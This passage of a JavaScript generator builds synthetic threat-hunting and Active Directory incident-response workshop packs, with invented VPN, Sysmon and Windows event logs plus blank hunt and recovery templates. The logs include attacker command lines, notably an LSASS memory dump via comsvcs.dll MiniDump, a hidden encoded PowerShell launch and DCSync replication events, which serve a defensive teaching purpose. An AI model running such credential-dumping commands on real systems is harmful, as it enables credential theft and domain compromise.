| Execution | | | |
| Download | | | |
| Persistence | | | |
| C2 | | | |

### Which of these would have fired earliest, and what damage was already done by then?

>
`,
    ),
  )
  return files
}

function session09() {
  const files = []
  const vpn = []
  const users = ['a.hassan', 'f.alsalem', 'n.aldosari', 'y.almutairi', 'r.alenezi', 'm.alotaibi', 's.alqattan']
  for (let i = 0; i < 120; i++) {
    vpn.push(
      `2026-03-${pad(int(1, 28))} ${hhmmss(int(6, 20), int(0, 59), int(0, 59))}  ${pick(users).padEnd(13)}  94[.]203[.]${int(10, 14)}[.]${int(2, 250)}  KW  SUCCESS`,
    )
  }
  vpn.push('2026-03-11 02:04:17  jsmith         86[.]120[.]44[.]19     RO  SUCCESS')
  vpn.push('2026-03-08 09:12:03  jsmith         94[.]203[.]12[.]88     KW  SUCCESS')
  vpn.push('2026-03-09 08:41:55  jsmith         94[.]203[.]12[.]88     KW  SUCCESS')
  vpn.push('2026-03-10 09:02:11  jsmith         94[.]203[.]12[.]88     KW  SUCCESS')
  vpn.sort()

  files.push(
    write(
      'threat-hunting',
      '00-hunt-pack.md',
      `${BANNER(
        'Session 9 — Hunt pack',
        'Thirty days of VPN, Sysmon and Windows Security events, plus the environment baseline. Write your hypotheses BEFORE opening the data.',
      )}
## Environment baseline — read this first

\`\`\`
ESTATE
  Workstations        480
  Servers              62
  Domain controllers    3   (DC-01 10.0.0.5, DC-02 10.0.0.6, DC-03 10.0.0.7)
  File servers          4   (FILESERVER-01 .15, -02 .16, -03 .17, -04 .18)

AUTHENTICATION
  Normal VPN source countries : KW only
  Corporate VPN egress        : 94[.]203[.]12[.]0/24  (resolves to KW)
  Working hours               : 07:00-19:00 Sunday-Thursday

WMI
  WmiPrvSE.exe legitimately spawns, on this estate:
    msiexec.exe       software installation
    svchost.exe       service host
    WmiPrvSE.exe      additional provider hosts
    CompatTelRunner.exe  Windows telemetry
  Anything else is outside the baseline.

AUDITING STATUS  <-- check this before interpreting ANY null result
  Process creation (4688) with command line : ENABLED
  PowerShell script block logging           : ENABLED
  Directory Service Object Access (4662)    : ENABLED, since 2026-01-04
  Relevant replication SACL and collection : VERIFIED for this synthetic window
  Sysmon                                    : deployed, 94% of estate
  Kerberos service ticket auditing (4769)   : ENABLED
\`\`\`

---

## Data source 1 — VPN authentication (30 days, abridged)

\`\`\`
DATE       TIME      USER           SOURCE                 COUNTRY  RESULT
${vpn.slice(0, 60).join('\n')}
... (further entries omitted for length) ...
\`\`\`

---

## Data source 2 — Sysmon Event ID 1, filtered to WmiPrvSE.exe as parent (30 days)

\`\`\`
DATE       TIME      HOST             USER       IMAGE                    COMMANDLINE
2026-02-14 11:02:44  WS-0188          SYSTEM     msiexec.exe              msiexec /i package.msi /quiet
2026-02-19 14:33:12  WS-0221          SYSTEM     CompatTelRunner.exe      -m:appraiser.dll
2026-02-26 09:14:08  WS-0045          SYSTEM     msiexec.exe              msiexec /i update.msi /quiet
2026-03-02 16:21:55  WS-0311          SYSTEM     svchost.exe              -k netsvcs
2026-03-11 02:14:33  FILESERVER-01    jsmith     cmd.exe                  cmd.exe /c "net group \\"Domain Admins\\" /domain"
2026-03-11 02:14:41  FILESERVER-01    jsmith     powershell.exe           powershell -nop -w hidden -enc SQBFAFgA...
2026-03-11 02:18:02  FILESERVER-01    jsmith     cmd.exe                  cmd.exe /c "whoami /priv"
2026-03-14 10:08:19  WS-0092          SYSTEM     msiexec.exe              msiexec /i hotfix.msi /quiet
\`\`\`

---

## Data source 3 — Windows Security Event ID 4662 (30 days, replication properties only)

The source-host column is pre-correlated enrichment from matching logon IDs in Event ID4624 on the same recording DC. It is not a native4662 field. Validate source roles and authorised replication services; do not exclude accounts solely because their names end in$.

\`\`\`
DATE       TIME      LOGGING DC  SUBJECT USER  SOURCE HOST      PROPERTIES
2026-02-20 03:00:14  DC-02       DC-01$        DC-01            1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
2026-02-20 03:00:14  DC-03       DC-01$        DC-01            1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
2026-02-27 03:00:11  DC-02       DC-01$        DC-01            1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
2026-03-06 03:00:09  DC-03       DC-02$        DC-02            1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
2026-03-11 02:47:03  DC-01       jsmith        FILESERVER-01    1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
2026-03-11 02:47:03  DC-01       jsmith        FILESERVER-01    1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
2026-03-13 03:00:22  DC-02       DC-01$        DC-01            1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
\`\`\`

---

## Data source 4 — Windows Security Event ID 4624, LogonType 3 (abridged, 11 March only)

\`\`\`
TIME      TARGET USER   SOURCE HOST      DEST HOST        AUTH PACKAGE
02:09:41  jsmith        WS-0144          FILESERVER-01    NTLM
02:11:02  jsmith        WS-0144          FILESERVER-02    NTLM
02:12:30  jsmith        WS-0144          FILESERVER-03    NTLM
02:13:55  jsmith        WS-0144          DC-01            NTLM
08:02:11  a.hassan      WS-0088          FILESERVER-01    Kerberos
08:14:55  f.alsalem     WS-0102          FILESERVER-02    Kerberos
09:31:08  n.aldosari    WS-0211          FILESERVER-01    Kerberos
\`\`\`
`,
    ),
  )

  files.push(
    write(
      'threat-hunting',
      '01-hunt-record-template.md',
      `${BANNER(
        'Session 9 — Hunt record template',
        'Complete one record per hypothesis, INCLUDING the refuted ones. A refuted record is the one with regulatory value.',
      )}
# HUNT RECORD

> Complete the hypothesis section **before** you run a single query. Writing
> it afterwards invalidates every negative result and is visible in the
> record. It is 25% of the assessment.

---

## Hypothesis

> I believe **[behaviour]** may be occurring because **[reason]**, and I would
> expect to see **[evidence]** in **[data source]**.

**Filled in:**

>

| Component | Your answer |
|---|---|
| Behaviour (specific technique) | |
| Reason (what prompted this hunt) | |
| Expected evidence (event ID AND field) | |
| Data source | |
| **Is that data source actually available?** | ☐ verified present ☐ absent |

**What a confirmed result would look like:**

>

**What a refuted result would look like:**

>

---

## Metadata

| Field | Value |
|---|---|
| Hunt title | |
| Date | |
| Hunter | |
| MITRE technique | |
| Time range covered | |

---

## Queries run

### Query 1
\`\`\`

\`\`\`
**Result summary:**

>

### Query 2
\`\`\`

\`\`\`
**Result summary:**

>

---

## Eliminations

Known false positives you ruled out, and what ruled them out. Showing the
working here is worth more than the conclusion.

| Candidate | Why it is not a finding |
|---|---|
| | |

---

## Outcome

☐ **CONFIRMED** — escalate to IR, preserve evidence, write the detection rule
☐ **REFUTED** — document the query; this is a coverage confirmation
☐ **INCONCLUSIVE** — identify the missing data; raise a logging ticket

**Evidence:**

>

**Actions taken:**

>

**Detection rule created:** *(mandatory for every confirmed finding)*

>

**Known false positives for future hunters:**

>

**Notes for whoever runs this hunt next:**

>

---

## Chain check

If more than one hypothesis confirmed, do the findings share an account, a
host or a time window? Three related findings are one intrusion, not three
incidents.

| Time | Hypothesis | Finding | Shared element |
|---|---|---|---|
| | | | |
`,
    ),
  )
  return files
}

function session10() {
  const files = []
  files.push(
    write(
      'active-directory-security',
      '00-ad-incident-pack.md',
      `${BANNER(
        'Session 10 — Active Directory incident pack',
        'Two workstations appear in this pack. Both matter. Read the detection rule inventory early.',
      )}
## The alert

\`\`\`
04:07:12  SIEM ALERT  P1
Rule   : AD-DCSYNC-001 · Unexpected directory replication activity
Detail : Event ID 4662, SubjectUserName=jsmith, source WORKSTATION-22,
         Properties contains 1131f6aa and 1131f6ad
Note   : WORKSTATION-22 is not a domain controller. The SIEM source field
         is correlated from4624 on the recording DC, not native4662 data.
\`\`\`

---

## 1. Windows Security events (domain controllers + workstations, 11 March)

\`\`\`
TIME      EVENT  HOST             DETAIL
------    -----  ---------------  ------------------------------------------------------
17:02:11  4624   WORKSTATION-14   LogonType=2  user=jsmith  AuthPkg=Kerberos   (10 Mar)
01:48:30  4688   WORKSTATION-14   user=jsmith  Image=rundll32.exe
                                  CommandLine=rundll32.exe C:\\Windows\\System32\\comsvcs.dll,
                                  MiniDump 684 C:\\Users\\Public\\l.bin full
01:48:31  4673   WORKSTATION-14   user=jsmith  Privilege=SeDebugPrivilege  Service=LSASS
02:00:04  4624   FILESERVER-01    LogonType=3  user=svc_backup  AuthPkg=NTLM
                                  source=WORKSTATION-14
02:04:19  4624   FILESERVER-02    LogonType=3  user=svc_backup  AuthPkg=NTLM
                                  source=WORKSTATION-14
02:08:44  4624   DC-01            LogonType=3  user=svc_backup  AuthPkg=NTLM
                                  source=WORKSTATION-14
02:12:30  4624   WORKSTATION-22   LogonType=3  user=svc_backup  AuthPkg=NTLM
                                  source=WORKSTATION-14
02:14:02  5140   FILESERVER-01    ShareName=\\\\*\\ADMIN$  user=svc_backup
                                  source=WORKSTATION-14
03:12:55  4769   DC-01            user=svc_backup  ServiceName=svc_sql
                                  TicketEncryptionType=0x17
03:18:40  4728   DC-01            GroupName="Domain Admins"  MemberAdded=svc_backup
                                  SubjectUserName=svc_backup
03:52:18  4698   DC-01            TaskName=\\WindowsUpdateHelper
                                  TaskContent=C:\\Windows\\Temp\\wuh.exe
                                  SubjectUserName=svc_backup
04:06:57  4624   DC-01            user=jsmith  LogonType=3  TargetLogonId=0x9c21
                                  source=WORKSTATION-22
04:07:12  4662   DC-01            user=jsmith  SubjectLogonId=0x9c21  Properties=1131f6aa,1131f6ad
04:07:12  4662   DC-01            user=jsmith  SubjectLogonId=0x9c21  Properties=1131f6ad
04:11:08  4794   DC-01            DSRM administrator password set attempt
                                  SubjectUserName=svc_backup
04:19:33  5136   DC-01            ObjectDN=CN=AdminSDHolder,CN=System,DC=corp,DC=local
                                  AttributeLDAPDisplayName=nTSecurityDescriptor
                                  SubjectUserName=svc_backup
\`\`\`

---

## 2. Group membership change log (30 days)

\`\`\`
DATE        TIME      GROUP                 MEMBER ADDED    BY              CHANGE TICKET
2026-02-18  10:04:22  Backup Operators      svc_backup      admin.rashid    CHG-11204
2026-03-11  03:18:40  Domain Admins         svc_backup      svc_backup      (none)
\`\`\`

---

## 3. Scheduled task inventory — domain controllers

\`\`\`
HOST    TASK NAME                        ACTION                               CREATED
DC-01   \\Microsoft\\Windows\\...\\SyncTime   %windir%\\system32\\sc.exe             (built-in)
DC-01   \\CorpBackupPreflight             D:\\Scripts\\preflight.ps1             2025-06-02
DC-01   \\WindowsUpdateHelper             C:\\Windows\\Temp\\wuh.exe              2026-03-11
DC-02   \\Microsoft\\Windows\\...\\SyncTime   %windir%\\system32\\sc.exe             (built-in)
DC-02   \\CorpBackupPreflight             D:\\Scripts\\preflight.ps1             2025-06-02
DC-03   \\Microsoft\\Windows\\...\\SyncTime   %windir%\\system32\\sc.exe             (built-in)
DC-03   \\CorpBackupPreflight             D:\\Scripts\\preflight.ps1             2025-06-02
\`\`\`

---

## 4. Detection rule inventory (AD-relevant rules only)

\`\`\`csv
rule_id,title,event_id,status,fired_this_incident
AD-DCSYNC-001,Unexpected directory replication activity,4662,stable,YES
AD-GRP-002,Privileged group membership change,4728/4732/4756,stable,NO (disabled 2026-01-12 for noise)
AD-NTLM-003,NTLM network logon from non-admin source,4624,not deployed,NO
AD-KRB-004,RC4 service ticket for non-computer account,4769,not deployed,NO
AD-DSRM-005,DSRM password change,4794,not deployed,NO
AD-SDH-006,AdminSDHolder modification,5136,not deployed,NO
AD-SMB-007,Admin share access from non-admin source,5140,not deployed,NO
CRED-009,LSASS process access from non-system process,4673/Sysmon 10,stable,NO (Sysmon not deployed on WORKSTATION-14)
\`\`\`

> One rule fired. One was disabled for noise three months ago. Six were never
> deployed. One could not fire because its data source is absent on the host
> where it mattered. Task T5 is ordering these by the lead time each would
> have given.

---

## 5. Domain controller replication status

\`\`\`
$ repadmin /showrepl /csv  (abridged)

Source DC   Dest DC   Last success         Consecutive failures
DC-01       DC-02     2026-03-11 04:45:02  0
DC-01       DC-03     2026-03-11 04:45:08  0
DC-02       DC-01     2026-03-11 04:44:51  0
DC-02       DC-03     2026-03-11 04:45:11  0
DC-03       DC-01     2026-03-11 04:44:58  0
DC-03       DC-02     2026-03-11 04:45:04  0

All replication healthy.
\`\`\`
`,
    ),
  )

  files.push(
    write(
      'active-directory-security',
      '01-recovery-plan-template.md',
      `${BANNER(
        'Session 10 — Recovery plan template',
        'A step with no verification is a hope. Every step needs one.',
      )}
## Confirmed finding and scope

**Finding:**

>

**Scope statement** — name explicitly what must now be presumed compromised,
and why a password reset alone is insufficient:

>

**Directory Service Object Access auditing status at the time:**

>

---

## Escalation chain, reconstructed

| Time | Event ID | Host | Technique | ATT&CK ID |
|---|---|---|---|---|
| | | | | |

**How the original credential was obtained** *(this happens before the first
domain event — look at the first source workstation)*:

>

---

## Persistence inventory

| Mechanism | Location | Event ID | Removed by a password reset? |
|---|---|---|---|
| | | | ☐ yes ☐ no |
| | | | ☐ yes ☐ no |
| | | | ☐ yes ☐ no |
| | | | ☐ yes ☐ no |

**Which of these would survive a thorough but conventional response?**

>

---

## Recovery plan

Sequenced. Dependencies stated. Every step verified.

| # | Action | Depends on | How you verify it succeeded |
|---|---|---|---|
| 1 | | | |
| 2 | | | |
| 3 | | | |
| 4 | | | |
| 5 | | | |
| 6 | | | |
| 7 | | | |
| 8 | | | |
| 9 | | | |
| 10 | | | |

### Coordinate KRBTGT recovery with the AD team

| # | Step | Verification | Done |
|---|---|---|---|
| 1 | Confirm all DCs online and replicating | \`repadmin /showrepl\` — all success, 0 failures | ☐ |
| 2 | Reset KRBTGT password (first) | | ☐ |
| 3 | Wait the configured ticket-lifetime interval; verify first-reset replication | | ☐ |
| 4 | Reset KRBTGT password (second) | | ☐ |
| 5 | Wait for replication, then **verify** | | ☐ |
| 6 | Coordinate helpdesk and verify authentication impact | | ☐ |

Follow the current Microsoft procedure. At default ticket lifetimes, allow at least ten hours between resets, longer if required by configured policy, and verify replication. Do not treat this worksheet as a live reset runbook.

**Why twice, in your own words:**

>

**What happens if you skip the verification between resets:**

>

---

## Detection gap analysis, ordered by lead time

| # | Stage | Rule existed? | Fired? | Lead time it would have given |
|---|---|---|---|---|
| 1 | | | | |
| 2 | | | | |
| 3 | | | | |
| 4 | | | | |
| 5 | | | | |
| 6 | | | | |

**The single highest-value rule to deploy tomorrow:**

| Field | Value |
|---|---|
| Data source | |
| Condition | |
| Lead time it would have given | |

---

## The ten-minute question

> If this happened again tomorrow, would you detect it in the first ten
> minutes?

**Answer, honestly:**

>
`,
    ),
  )
  return files
}

/* ---------- Run -------------------------------------------------------- */

const all = [
  ...session01(),
  ...session02(),
  ...session03(),
  ...session04(),
  ...session05(),
  ...session06(),
  ...session07(),
  ...session08(),
  ...session09(),
  ...session10(),
]

const index = `${BANNER(
  'Workshop resources',
  'Every file below is synthetic teaching data. No instructor answer keys or solution walkthroughs are published here — see the repository README.',
)}
## Files

${all.map((f) => `- \`${f}\``).join('\n')}

## Regenerating

\`\`\`bash
npm run resources
\`\`\`

The generator is deterministic: the same seed produces the same packs every
time, so every student in a room is looking at identical data and an
instructor can refer to a specific line.
`

writeFileSync(join(OUT, 'README.md'), index.trimStart() + '\n', 'utf8')

console.log(`Generated ${all.length} resource files across ${new Set(all.map((f) => f.split('/')[0])).size} sessions.`)
all.forEach((f) => console.log(`  public/resources/${f}`))
